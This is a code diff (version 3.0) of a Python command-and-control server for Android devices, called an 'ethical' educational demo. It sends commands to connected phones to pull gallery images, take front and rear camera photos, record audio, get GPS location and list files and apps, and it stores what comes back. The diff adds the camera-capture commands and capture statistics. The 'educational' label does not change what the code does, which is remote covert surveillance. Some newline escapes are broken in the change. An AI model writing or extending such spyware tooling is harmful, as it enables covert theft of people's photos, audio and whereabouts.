@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-Ethical Android Device Demo Server - Enhanced Version
+Ethical Android Device Demo Server - Enhanced Version 3.0
 For educational purposes only - demonstrates legitimate client-server communication
-with two-way command system, file receiving, and logging.
+with improved reliability, better logging, and enhanced user experience.
 """
 
 import socket
@@ -11,6 +11,8 @@ import threading
 import os
 import time
 from datetime import datetime
+import signal
+import sys
 
 # Create directories for received files
 RECEIVED_DIR = "received_files"
@@ -19,6 +21,7 @@ AUDIO_DIR = os.path.join(RECEIVED_DIR, "audio")
 DOCS_DIR = os.path.join(RECEIVED_DIR, "docs")
 LOG_FILE = "device_logs.json"
 HISTORY_FILE = "command_history.log"
+STATS_FILE = "server_stats.json"
 
 for d in [RECEIVED_DIR, IMAGES_DIR, AUDIO_DIR, DOCS_DIR]:
     os.makedirs(d, exist_ok=True)
@@ -32,6 +35,11 @@ class DeviceSession:
         self.connected = True
         self.last_heartbeat = time.time()
         self.device_info = {}
+        self.total_images_received = 0
+        self.total_audio_received = 0
+        self.total_commands_processed = 0
+        self.bytes_received = 0
+        self.bytes_sent = 0
 
 class DemoServer:
     def __init__(self, host='0.0.0.0', port=8000):
@@ -42,6 +50,18 @@ class DemoServer:
         self.sessions = {}
         self.session_counter = 0
         self.lock = threading.Lock()
+        self.start_time = time.time()
+        self.stats = {
+            'total_connections': 0,
+            'active_connections': 0,
+            'total_images': 0,
+            'total_audio': 0,
+            'total_commands': 0,
+            'uptime_start': self.start_time
+        }
+        
+        # Load existing stats if available
+        self.load_stats()
 
     def log(self, message):
         """Log to console with timestamp"""
@@ -74,7 +94,43 @@ class DemoServer:
         """Log commands to history file"""
         ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         with open(HISTORY_FILE, 'a') as f:
-            f.write(f"[{ts}] Session {session_id} | Command: {command} | Result: {result}\n")
+            f.write(f"[{ts}] Session {session_id} | Command: {command} | Result: {result}\\n")
+
+    def update_stats(self):
+        """Update server statistics"""
+        with self.lock:
+            self.stats['active_connections'] = len([s for s in self.sessions.values() if s.connected])
+            self.stats['total_connections'] = self.session_counter
+            self.stats['total_images'] = sum(s.total_images_received for s in self.sessions.values())
+            self.stats['total_audio'] = sum(s.total_audio_received for s in self.sessions.values())
+            self.stats['total_commands'] = sum(s.total_commands_processed for s in self.sessions.values())
+            self.stats['uptime'] = time.time() - self.start_time
+        
+    def save_stats(self):
+        """Save statistics to file"""
+        try:
+            with open(STATS_FILE, 'w') as f:
+                json.dump(self.stats, f, indent=2)
+        except Exception as e:
+            self.log(f"[!] Failed to save stats: {e}")
+
+    def load_stats(self):
+        """Load statistics from file"""
+        try:
+            if os.path.exists(STATS_FILE):
+                with open(STATS_FILE, 'r') as f:
+                    self.stats = json.load(f)
+        except Exception as e:
+            self.log(f"[!] Failed to load stats: {e}")
+            # Initialize with defaults if loading fails
+            self.stats = {
+                'total_connections': 0,
+                'active_connections': 0,
+                'total_images': 0,
+                'total_audio': 0,
+                'total_commands': 0,
+                'uptime_start': time.time()
+            }
 
     def start(self):
         """Start the server"""
@@ -86,15 +142,16 @@ class DemoServer:
             self.running = True
 
             self.log("=" * 60)
-            self.log("  ANDROID DEVICE DEMO SERVER - ENHANCED")
+            self.log("  ANDROID DEVICE DEMO SERVER - VERSION 3.0")
             self.log("  Educational Purpose Only")
             self.log("=" * 60)
             self.log(f"[+] Server listening on {self.host}:{self.port}")
             self.log(f"[+] Files saved to: {os.path.abspath(RECEIVED_DIR)}/")
             self.log(f"[+] Logs saved to: {LOG_FILE}")
             self.log(f"[+] Command history: {HISTORY_FILE}")
+            self.log(f"[+] Server stats: {STATS_FILE}")
             self.log("=" * 60)
-            self.log("\nAvailable commands:")
+            self.log("\\nAvailable commands:")
             self.log("  1. download_gallery  - Request image from device gallery")
             self.log("  2. take_photo        - Request camera capture")
             self.log("  3. get_location      - Request GPS coordinates")
@@ -104,8 +161,11 @@ class DemoServer:
             self.log("  7. get_device_info   - Request device information")
             self.log("  8. list_devices      - Show connected devices")
             self.log("  9. heartbeat         - Send heartbeat ping")
-            self.log("  10. help             - Show this help")
-            self.log("  11. quit             - Stop server")
+            self.log("  10. capture_front    - Request front camera capture")
+            self.log("  11. capture_back     - Request rear camera capture")
+            self.log("  12. stats            - Show server statistics")
+            self.log("  13. help             - Show this help")
+            self.log("  14. quit             - Stop server")
             self.log("=" * 60)
 
             # Start console command thread
@@ -125,6 +185,7 @@ class DemoServer:
                     session = DeviceSession(session_id, address, client_socket)
                     with self.lock:
                         self.sessions[session_id] = session
+                    self.stats['total_connections'] = self.session_counter
 
                     self.log(f"[+] New connection #{session_id} from {address[0]}:{address[1]}")
                     client_thread = threading.Thread(
@@ -144,6 +205,7 @@ class DemoServer:
         finally:
             if self.server_socket:
                 self.server_socket.close()
+            self.save_stats()
 
     def heartbeat_monitor(self):
         """Monitor device heartbeats and mark stale sessions"""
@@ -164,7 +226,7 @@ class DemoServer:
         """Server console for sending commands to devices"""
         while self.running:
             try:
-                cmd = input("\n> ").strip()
+                cmd = input("\\n> ").strip()
                 if not cmd:
                     continue
 
@@ -192,8 +254,12 @@ class DemoServer:
                 elif command == "get_device_info":
                     self.send_command_to_all("get_device_info")
 
+                elif command == "stats":
+                    self.show_stats()
+
                 elif command in ["download_gallery", "take_photo", "get_location",
-                                 "get_file_list", "record_audio", "get_app_list"]:
+                                 "get_file_list", "record_audio", "get_app_list",
+                                 "capture_front", "capture_back"]:
                     self.send_command_to_all(command)
 
                 else:
@@ -206,7 +272,7 @@ class DemoServer:
 
     def show_help(self):
         """Show available commands"""
-        print("\n" + "=" * 50)
+        print("\\n" + "=" * 50)
         print("  AVAILABLE COMMANDS")
         print("=" * 50)
         print("  1. download_gallery  - Request image from gallery")
@@ -218,24 +284,45 @@ class DemoServer:
         print("  7. get_device_info   - Request device information")
         print("  8. list_devices      - Show connected devices")
         print("  9. heartbeat         - Send heartbeat ping")
-        print("  10. help             - Show this help")
-        print("  11. quit             - Stop server")
+        print("  10. capture_front    - Request front camera capture")
+        print("  11. capture_back     - Request rear camera capture")
+        print("  12. stats            - Show server statistics")
+        print("  13. help             - Show this help")
+        print("  14. quit             - Stop server")
+        print("=" * 50)
+
+    def show_stats(self):
+        """Show server statistics"""
+        self.update_stats()
+        print("\\n" + "=" * 50)
+        print("  SERVER STATISTICS")
+        print("=" * 50)
+        print(f"  Uptime: {self.stats['uptime']:.0f} seconds ({self.stats['uptime']/3600:.1f} hours)")
+        print(f"  Total Connections: {self.stats['total_connections']}")
+        print(f"  Active Connections: {self.stats['active_connections']}")
+        print(f"  Total Images Received: {self.stats['total_images']}")
+        print(f"  Total Audio Clips Received: {self.stats['total_audio']}")
+        print(f"  Total Commands Processed: {self.stats['total_commands']}")
         print("=" * 50)
 
     def list_devices(self):
         """List all connected devices"""
         with self.lock:
             if not self.sessions:
-                print("\n  No devices connected.")
+                print("\\n  No devices connected.")
                 return
-            print(f"\n  Connected Devices ({len(self.sessions)}):")
-            print("  " + "-" * 50)
+            print(f"\\n  Connected Devices ({len(self.sessions)}):")
+            print("  " + "-" * 70)
+            print(f"  {'ID':<4} | {'IP Address':<15} | {'Model':<20} | {'Status':<8} | {'Images':<6} | {'Audio':<5}")
+            print("  " + "-" * 70)
             for sid, session in self.sessions.items():
                 status = "ONLINE" if session.connected else "OFFLINE"
                 ip = session.address[0]
-                model = session.device_info.get('model', 'Unknown')
-                print(f"  #{sid} | {ip} | {model} | {status}")
-            print("  " + "-" * 50)
+                model = session.device_info.get('model', 'Unknown')[:20]
+                images = session.total_images_received
+                audio = session.total_audio_received
+                print(f"  {sid:<4} | {ip:<15} | {model:<20} | {status:<8} | {images:<6} | {audio:<5}")
+            print("  " + "-" * 70)
 
     def send_command_to_all(self, command):
         """Send command to all connected devices"""
@@ -256,6 +343,8 @@ class DemoServer:
         try:
             msg = json.dumps({"type": "command", "command": command}).encode('utf-8')
             session.client_socket.send(msg)
+            with self.lock:
+                session.bytes_sent += len(msg)
         except Exception as e:
             self.log(f"[!] Failed to send command to session {session.session_id}: {e}")
             session.connected = False
@@ -359,6 +448,8 @@ class DemoServer:
             # Send acknowledgment
             ack = json.dumps({"type": "ack", "message": "ready_to_receive"}).encode('utf-8')
             session.client_socket.send(ack)
+            with self.lock:
+                session.bytes_sent += len(ack)
 
         elif msg_type == "file_transfer_complete":
             self.log(f"[+] File transfer complete from session {session.session_id}")
@@ -384,6 +475,31 @@ class DemoServer:
                 with open(filepath, 'wb') as f:
                     f.write(audio_bytes)
                 self.log(f"[+] Audio saved: {filepath} ({len(audio_bytes)} bytes)")
+                with self.lock:
+                    session.total_audio_received += 1
+            self.log_to_file(message, session.address)
+
+        elif msg_type == "capture_response":
+            # Handle camera capture responses from client
+            timestamp = message.get("timestamp", 0)
+            capture_status = message.get("capture_status", "unknown")
+            upload_status = message.get("upload_status", "unknown")
+            filename = message.get("filename", "unknown")
+            file_size = message.get("file_size", 0)
+            
+            self.log(f"[i] Capture response from session {session.session_id}:")
+            self.log(f"    Timestamp: {timestamp}")
+            self.log(f"    Capture Status: {capture_status}")
+            self.log(f"    Upload Status: {upload_status}")
+            self.log(f"    Filename: {filename}")
+            self.log(f"    File Size: {file_size} bytes")
+            
+            if upload_status == "queued":
+                self.log(f"    (Image queued for upload)")
+            elif upload_status == "success":
+                self.log(f"    (Image successfully uploaded)")
+                with self.lock:
+                    session.total_images_received += 1
             self.log_to_file(message, session.address)
 
         else:
@@ -413,6 +529,11 @@ class DemoServer:
                     f.write(pending["data"])
 
                 self.log(f"[+] File saved: {filepath} ({len(pending['data'])} bytes)")
+                with self.lock:
+                    if file_type == "image":
+                        session.total_images_received += 1
+                    elif file_type == "audio":
+                        session.total_audio_received += 1
 
                 # Send acknowledgment
                 ack = json.dumps({
@@ -421,6 +542,8 @@ class DemoServer:
                     "filename": filename
                 }).encode('utf-8')
                 session.client_socket.send(ack)
+                with self.lock:
+                    session.bytes_sent += len(ack)
 
                 # Clear pending file
                 session.device_info.pop("pending_file", None)
